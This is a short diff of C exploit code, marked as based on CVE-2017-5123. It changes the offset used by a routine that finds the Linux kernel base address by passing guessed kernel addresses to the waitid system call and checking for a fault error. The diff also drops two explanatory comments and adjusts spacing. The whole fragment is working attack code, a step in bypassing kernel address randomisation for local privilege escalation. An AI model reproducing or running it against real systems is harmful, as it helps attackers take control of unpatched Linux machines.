@@ -7,15 +7,13 @@
 unsigned long kernel_base;
 
 // based on CVE-2017-5123
-#define start_rw_off 0x9f5fe0
+#define start_rw_off 0x8df000
 unsigned long get_kernel_base() {
-  // first we try doing our arb write to find the system base address
-  // if syscall is 0 we didn't fault
   unsigned long start = 0xffffffff00000000;
   unsigned long inc =   0x0000000000100000;
   unsigned long guess = start;
   while (guess != 0) {
-    int res = syscall(SYS_waitid, P_ALL, 0, guess+start_rw_off, WEXITED, NULL);
+    int res = syscall(SYS_waitid, P_ALL, 0, guess + start_rw_off, WEXITED, NULL);
     if (errno != 14) {
       printf("found kernel base 0x%lx\n", guess);
       kernel_base = guess;
